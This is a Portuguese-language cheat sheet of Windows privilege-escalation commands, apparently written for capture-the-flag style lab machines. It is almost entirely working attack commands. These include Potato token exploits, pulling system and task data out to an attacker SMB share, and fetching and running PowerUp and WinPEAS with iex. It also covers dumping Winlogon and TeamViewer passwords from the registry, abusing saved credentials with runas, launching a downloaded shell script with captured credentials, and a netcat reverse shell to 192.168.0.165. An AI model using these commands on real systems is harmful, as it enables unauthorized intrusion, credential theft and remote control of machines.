# Windows Privilege Escalation&#x20;

## Windows

Primeiramente, devemos dar uma checada em alguns diretórios principais, sendo eles o diretório do usuário, o C:, verificar se existem outros volumes que precisam ser montados ou até mesmo biniários que estejam evidenciando algum serviço explorável, por exemplo. Podemos usar os seguintes comandos para tal objetivo:

Teste basiquinho primeiro, porque mudei de ideia:

```
whoami /priv
```

Aqui vale considerar os exploits Potatoes:

```
PrintSpoofer32.exe -i -c powershell
```

O exploit abaixo tem que considerar as portas abertas no firewall para ele funcionar adequadamente:

```
./jp.exe -t * -p c:\temp\s.bat [-l porta]
```

Esse juicyPotato que funcionou é o que se encontra neste link:

[https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip](https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip)

agora sim uma checada nos diretórios da máquina:

### Checagem de diretórios

```
gci -recurse -filter <file_name> [-Path]
```

```
cd c:\users
gci -recurse
```

```
dir /s /b /a:-d-h \Users\alfred | findstr /i /v "appdata"
```

```
gci 'c:\program files','c:\program files (x86)' | ft name, path, lastwritetime
```

### Kernel Exploitation

[https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

```
systeminfo > si.txt
copy si.txt \\10.10.14.17\smb\si.txt
```

Depois na máquina atacante basta executarmos o windows exploit suggester:

```
python windows-exploit-suggester.py -u
python windows-exploit-suggester.py -d 2024-01-23-mssb.xlsx -i si.txt
```

### PowerUp.ps1 e WinPEAS.exe

```
(new-object net.webclient).downloadfile('http://<hostname>/4-privilege%20escalation/PowerUp.ps1', 'c:\temp\pu.ps1')
. ./pu.ps1
invoke-allchecks
```

```
iex (new-object net.webclient).downloadstring('http://<hostname>/PowerUp.ps1'); invoke-allchecks
```

```
(new-object net.webclient).downloadfile('http://10.10.14.14/4-privilege%20escalation/winPEASx64.exe', 'c:\temp\w.exe')
```

### Enumerar processos na máquina

Aqui vale considerar também os permissionamentos que temos nas pastas que correspondem a serviços/processos que ocorrem na máquina para tentar alguma oportunidade de alterar o serviço/processo  de uma maneira não esperada.

```
get-process
wmic process
tasklist
tasklist /svc
```

```
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

```
\\vboxsvr\tools\accesschk.exe /accepteula -ucv <username> evilsvc
or
\\vboxsvr\tools\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

```
icacls C:\service.exe
```

Uma fonte interessante para auxiliar com esse processo pode ser encontrado em:

[https://www.ired.team/offensive-security/privilege-escalation/weak-service-permissions](https://www.ired.team/offensive-security/privilege-escalation/weak-service-permissions)

### Enumerar serviços rodando em localhost

```
netstat -nao
```

### Enumerar scheduled tasks

```
schtasks /query /fo LIST /v > schtasks.txt
copy schtasks.txt \\10.10.14.17\smb\scht.txt
```

Na máquina atacante, temos de filtrar esse output para verificar melhor cada coisa:

```
dos2unix scht.txt
cat scht.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
```

### Credenciais em registro

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

reg query HKLM\SOFTWARE\Wow6432Node\TeamViewer\Version7 /v SecurityPasswordAES

(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName   
    
(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
```

```
reg query HKLM /f *password* /t REG_SZ /s
    
reg query HKLM /f teamviewer /t REG_SZ /s
    
reg query HKCU /f password /t REG_SZ /s
```

### Credenciais em cache&#x20;

```
cmdkey /list
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
runas /savecred /user:Administrator "cmd.exe /k whoami"
```

### Dispositivos de armazenamento (device drivers)

<pre><code><strong>wmic logicaldisk get deviceid, volumename, description
</strong></code></pre>

```
powershell -c get-psdrive -psprovider filesystem
```

```
mountvol
mountvol G: \\?\Volume{ff136f5c-4935-11e9-80b5-806e6f6e6963}\
```

### Unquoted Service Paths

```
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

### Credenciais já obtidas

Todas as credenciais já obtidas é bom testar na máquina por meio de alguns testes básicos tais como:

```
$password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5:8000/shell2.ps1')" -Credential $cred
```

Outra opção seria:

```
$username = "arkham\batman"
$password = "Zx^#QZX+T!123"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
new-pssession -computername . -credential $cred
```

Além disso podemos considerar o runas também:

```
runas/user:acosta ".\nc64.exe -e C:\windows\system32\cmd.exe 192.168.0.165 8083"
```
